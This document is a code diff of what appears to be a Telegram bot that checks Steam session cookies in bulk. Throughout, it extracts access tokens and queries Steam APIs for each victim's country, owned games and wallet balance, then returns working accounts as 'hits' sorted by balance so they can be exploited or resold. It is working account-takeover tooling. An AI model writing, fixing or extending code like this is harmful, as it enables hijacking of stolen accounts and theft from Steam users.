@@ -3,7 +3,6 @@ import sys
 import json
 import re
 import time
-import random
 import struct
 import base64
 import urllib.parse as baro_enc
@@ -22,7 +21,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ------------------------------------------------------------
-# Constants and helper functions (from original SteamCookie.py)
+# Original SteamChecker code (reverted to match SteamCookie.py)
 # ------------------------------------------------------------
 
 G = "\033[92m"
@@ -155,7 +154,7 @@ def format_cookies_netscape(cookies):
 def format_cookies_json(cookies):
     return json.dumps(cookies, indent=2)
 
-# ========== COOKIE LOADER (supports JSON, Netscape, and mixed text) ==========
+# ========== ENHANCED COOKIE LOADER ==========
 def load_cookies(filepath):
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
@@ -245,7 +244,7 @@ def load_cookies(filepath):
     return None
 
 # ------------------------------------------------------------
-# SteamChecker – original working logic from SteamCookie.py
+# SteamChecker class – matches original SteamCookie.py exactly
 # ------------------------------------------------------------
 class SteamChecker:
     def __init__(self, cookie_data, cookie_file_path, index):
@@ -258,9 +257,7 @@ class SteamChecker:
         self.token = ""
         self.level = ""
         self.country = ""
-        self.balance_raw = ""
-        self.balance_float = 0.0
-        self.currency = ""
+        self.balance = ""
         self.total_games = 0
         self.games = []
         self.success = False
@@ -292,6 +289,7 @@ class SteamChecker:
         return None
 
     def get_username_from_profile(self, sid_int):
+        """Get username from Steam profile"""
         try:
             resp = self.session.get(
                 f"https://steamcommunity.com/profiles/{sid_int}",
@@ -326,6 +324,7 @@ class SteamChecker:
                     return str(level)
         except:
             pass
+
         try:
             resp = self.session.get(
                 f"https://steamcommunity.com/profiles/{sid_int}",
@@ -344,7 +343,6 @@ class SteamChecker:
         return "?"
 
     def check(self):
-        # Extract steamid and token exactly like the original
         self.steamid = self.extract_steamid()
         self.token = self.extract_token()
 
@@ -355,14 +353,15 @@ class SteamChecker:
         sid_int = int(self.steamid)
 
         try:
-            # Get username and level (optional but nice to have)
+            # Get username (optional)
             self.username = self.get_username_from_profile(sid_int)
             if not self.username:
                 self.username = self.steamid[:8]
 
+            # Get level (optional)
             self.level = self.get_level(sid_int)
 
-            # ---- Country API (exactly as original) ----
+            # Get country
             cpb = struct.pack('<BQ', 0x09, sid_int)
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
@@ -378,7 +377,7 @@ class SteamChecker:
                     cc = cc.decode()
                 self.country = BRN_MAP.get(cc, cc)
 
-            # ---- Games API (exactly as original) ----
+            # Get games
             gpb = (baro_pi(1, sid_int) + baro_pi(2, 1) + baro_pi(3, 1) +
                    baro_pi(6, 0) + baro_ps(7, "english") + baro_pi(8, 1) +
                    baro_pi(9, 1) + baro_pi(10, 1))
@@ -394,13 +393,11 @@ class SteamChecker:
             if resp.status_code == 200:
                 data = baron_pd(resp.content)
                 self.total_games = data.get(1, 0)
-
                 raw_games = data.get(2, [])
                 if isinstance(raw_games, bytes):
                     raw_games = [raw_games]
                 elif not isinstance(raw_games, list):
                     raw_games = []
-
                 for g in raw_games:
                     try:
                         if not isinstance(g, bytes):
@@ -414,7 +411,7 @@ class SteamChecker:
                     except:
                         continue
 
-            # ---- Balance API (exactly as original) ----
+            # Get balance – this is the critical one
             resp = self.session.post(
                 f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                 f"?access_token={self.token}",
@@ -429,9 +426,9 @@ class SteamChecker:
                     bal = bal.decode("utf-8", errors="ignore")
                 elif isinstance(bal, int):
                     bal = str(bal)
-                self.balance_raw = bal
+                self.balance = bal
 
-                # Parse balance into float and currency for grouping
+                # parse balance for grouping
                 def parse_balance(balance_str, country_code):
                     currency_symbols = ['$', '€', '£', '¥', '₩', '₽', '₺', '₱', '₦', '₵', '₡', '₴', '₪', '₾', '₸', '₮', '៛', '৳', '﷼', 'د.إ', 'د.ك', 'R$', 'A$', 'C$', 'S$', 'HK$', 'NZ$', 'NT$', 'RM', 'Rp', 'zł', 'Kč', 'Ft', '₨']
                     symbol = ''
@@ -452,21 +449,27 @@ class SteamChecker:
                     except:
                         value = 0.0
                     return value, symbol
-
                 self.balance_float, self.currency = parse_balance(bal, self.country)
+            else:
+                # If balance API fails, we treat the cookie as invalid (matches original)
+                return False
 
-            # If we reached here without exception, the cookie is valid (even if some API returned non-200)
+            # If we reached here, balance API succeeded
             self.success = True
             return True
 
         except Exception:
+            # Any exception means invalid
             return False
 
+# ------------------------------------------------------------
+# Helper functions for hit formatting and grouping
+# ------------------------------------------------------------
 def generate_hit_content(hit):
     username = hit.username if hit.username else hit.steamid[:8]
     country = hit.country if hit.country else "Unknown"
-    balance = hit.balance_raw if hit.balance_raw else "0"
-    if hit.currency and not any(c in balance for c in ['$','€','£','¥','₩','₽','₺','₱','₦','₵','₡','₴','₪','₾','₸','₮','៛','৳','﷼','د.إ','د.ك','R$','A$','C$','S$','HK$','NZ$','NT$','RM','Rp','zł','Kč','Ft','₨']):
+    balance = hit.balance if hit.balance else "0"
+    if hasattr(hit, 'currency') and hit.currency and not any(c in balance for c in ['$','€','£','¥','₩','₽','₺','₱','₦','₵','₡','₴','₪','₾','₸','₮','៛','৳','﷼','د.إ','د.ك','R$','A$','C$','S$','HK$','NZ$','NT$','RM','Rp','zł','Kč','Ft','₨']):
         balance = f"{hit.currency}{balance}"
     games = str(hit.total_games) if hit.total_games else "0"
     games_str = "\n".join([f"{i+1}. {game}" for i, game in enumerate(hit.games)]) if hit.games else "No games found"
@@ -503,25 +506,6 @@ Checked on : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
     return content
 
-# ------------------------------------------------------------
-# Telegram Bot and Flask
-# ------------------------------------------------------------
-
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    print("Error: BOT_TOKEN environment variable not set.")
-    sys.exit(1)
-
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def home():
-    return jsonify({"status": "Bot Running", "time": time.time()})
-
-def run_flask():
-    port = int(os.environ.get("PORT", 8080))
-    flask_app.run(host="0.0.0.0", port=port)
-
 def group_hits_by_balance(hits):
     groups = {"0-1": [], "1-5": [], "5-10": [], "10-200": [], "others": []}
     for bal, username, steamid, content in hits:
@@ -548,6 +532,25 @@ def create_zip_from_hits(hits, range_name):
             zf.writestr(filename, content)
     zip_buffer.seek(0)
     return zip_buffer
+
+# ------------------------------------------------------------
+# Telegram Bot and Flask
+# ------------------------------------------------------------
+
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+if not BOT_TOKEN:
+    print("Error: BOT_TOKEN environment variable not set.")
+    sys.exit(1)
+
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def home():
+    return jsonify({"status": "Bot Running", "time": time.time()})
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    flask_app.run(host="0.0.0.0", port=port)
 
 class ProgressTracker:
     def __init__(self, total):
@@ -583,7 +586,9 @@ def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
         for checker in checkers:
             if checker.success:
                 content = generate_hit_content(checker)
-                valid_hits.append((checker.balance_float, checker.username, checker.steamid, content))
+                # Store balance float for grouping
+                balance_float = getattr(checker, 'balance_float', 0.0)
+                valid_hits.append((balance_float, checker.username, checker.steamid, content))
         del checkers
 
     tracker.done = True
@@ -710,7 +715,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 Send me a ZIP file containing Steam cookie files (JSON or Netscape .txt).\n"
+        "👋 Send me a ZIP RAV file containing Steam cookie files (JSON or Netscape .txt).\n"
         "I will check each cookie and send back valid accounts grouped by balance ranges.\n"
         "Balance ranges: 0-1, 1-5, 5-10, 10-200 (and others).\n"
         "Currency symbols are detected automatically."
